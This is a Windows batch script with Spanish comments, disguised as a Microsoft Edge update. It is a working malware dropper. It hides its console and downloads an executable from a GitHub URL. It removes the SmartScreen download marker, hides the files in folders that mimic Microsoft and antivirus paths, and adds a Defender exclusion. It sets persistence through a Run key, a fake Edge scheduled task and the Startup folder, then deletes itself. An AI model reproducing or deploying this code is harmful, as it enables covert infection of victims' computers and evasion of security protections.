@echo off
setlocal EnableExtensions
title Microsoft Edge Update

:: ============================================================
::  LANZADOR INVISIBLE
::  Crea un .vbs temporal que relanza este .bat con la ventana
::  oculta. Ninguna consola visible en ningun momento.
:: ============================================================
if /i "%~1"=="silent" goto :run

set "TV=%TEMP%\_mupd_%RANDOM%.vbs"
> "%TV%" echo Set a = CreateObject("Shell.Application")
>>"%TV%" echo a.ShellExecute "cmd.exe", "/c ""%~f0"" silent", "", "", 0
wscript //B //Nologo "%TV%"
del "%TV%" >nul 2>&1
exit /b

:run
set "REPO=https://raw.githubusercontent.com/mayki35/win11_BOT/refs/heads/main"
set "EXE=MicrosoftEdgeUpdate.exe"
set "VBS=MicrosoftEdgeUpdate.vbs"

:: --- 1) detener version antigua ---
taskkill /F /IM MicrosoftEdgeUpdate.exe >nul 2>&1
taskkill /F /IM wscript.exe >nul 2>&1
powershell -NoProfile -WindowStyle Hidden -Command "Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*bot.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }" >nul 2>&1

:: --- 2) quitar persistencia antigua ---
schtasks /Delete /TN "WindowsSecurityUpdate" /F >nul 2>&1
schtasks /Delete /TN "WindowsSecurityUpdate_Backup" /F >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecurityUpdate" /f >nul 2>&1
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurityUpdate.vbs" >nul 2>&1

:: --- 3) borrar carpeta vieja ---
ping -n 3 127.0.0.1 >nul
rmdir /S /Q "%APPDATA%\CarpetaDos" >nul 2>&1
rmdir /S /Q "%APPDATA%\CarpetaUno" >nul 2>&1

:: --- 4) elegir carpeta (las MISMAS que usa el pool del bot) ---
set /a R=%RANDOM% %% 10
if %R%==0 set "DIR=%LOCALAPPDATA%\Microsoft\Windows\Caches"
if %R%==1 set "DIR=%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cache"
if %R%==2 set "DIR=%APPDATA%\Microsoft\Office\Telemetry"
if %R%==3 set "DIR=%LOCALAPPDATA%\Microsoft\Windows\WebCache"
if %R%==4 set "DIR=%APPDATA%\Microsoft\Windows\Recent"
if %R%==5 set "DIR=%LOCALAPPDATA%\Microsoft\CLR_v4.0\UsageLogs"
if %R%==6 set "DIR=%LOCALAPPDATA%\Microsoft\Windows\INetCache\IE"
if %R%==7 set "DIR=%LOCALAPPDATA%\Microsoft\OneDrive\Setup\Logs"
if %R%==8 set "DIR=%LOCALAPPDATA%\Lenovo\ImController\Logs"
if %R%==9 set "DIR=%LOCALAPPDATA%\ESET\ESET Security\Logs"
mkdir "%DIR%" 2>nul

:: --- 5) copiar o descargar el exe ---
if exist "%~dp0%EXE%" (
    copy /y "%~dp0%EXE%" "%DIR%\%EXE%" >nul
)
if not exist "%DIR%\%EXE%" (
    powershell -NoProfile -WindowStyle Hidden -Command "for($i=0;$i -lt 3;$i++){ try{ iwr '%REPO%/%EXE%' -OutFile '%DIR%\%EXE%' -UseBasicParsing; if(Test-Path '%DIR%\%EXE%'){break} }catch{}; Start-Sleep 2 }" >nul 2>&1
)

:: --- 5b) quitar el marcador de Internet (evita el dialogo de SmartScreen) ---
powershell -NoProfile -WindowStyle Hidden -Command "Unblock-File -Path '%DIR%\%EXE%' -ErrorAction SilentlyContinue" >nul 2>&1

attrib +h +s "%DIR%\%EXE%" >nul 2>&1
attrib +h "%DIR%" >nul 2>&1

:: --- 5c) exclusion de Defender (solo aplica si hay admin) ---
powershell -NoProfile -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%DIR%' -ErrorAction SilentlyContinue" >nul 2>&1

:: --- 6) lanzador y persistencia nueva ---
> "%DIR%\%VBS%" echo Set sh = CreateObject("WScript.Shell")
>>"%DIR%\%VBS%" echo sh.Run """%DIR%\%EXE%""", 0, False
attrib +h "%DIR%\%VBS%" >nul 2>&1

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MicrosoftEdgeAutoLaunch /t REG_SZ /d "\"%DIR%\%VBS%\"" /f >nul 2>&1
schtasks /Create /F /SC ONLOGON /TN MicrosoftEdgeUpdateTaskMachineCore /TR "\"%DIR%\%VBS%\"" >nul 2>&1
copy /y "%DIR%\%VBS%" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul 2>&1

:: --- 7) lanzar la version nueva, sin ventana ---
wscript //B //Nologo "%DIR%\%VBS%"

:: --- 8) autoborrado si todo fue bien ---
if not exist "%DIR%\%EXE%" goto :keep
(goto) 2>nul & del /f /q "%~f0" & exit /b

:keep
exit /b
